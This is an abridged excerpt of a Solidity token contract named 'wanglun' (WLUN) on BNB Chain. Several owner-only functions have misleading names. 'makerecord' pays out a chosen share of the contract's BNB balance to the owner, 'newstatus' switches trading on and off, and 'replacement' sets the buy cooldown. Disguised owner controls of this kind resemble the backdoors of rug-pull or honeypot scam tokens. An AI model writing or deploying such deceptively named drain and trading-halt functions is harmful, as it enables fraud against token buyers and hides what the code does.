...
abstract contract Authorization {
     ...
     */
    function receivetoken(address _auth) public onlyOwner {
...
contract wanglun is IERC20, Authorization {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "wanglun";
    string constant _symbol = "WLUN";
    ...
    function replacement(bool _status, uint8 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function makerecord(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(owner).transfer(amountBNB * amountPercentage / 100);
    }

    function newstatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    
    ...
    function updateFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function finishchecking(address holder, bool exempt) external authorized {
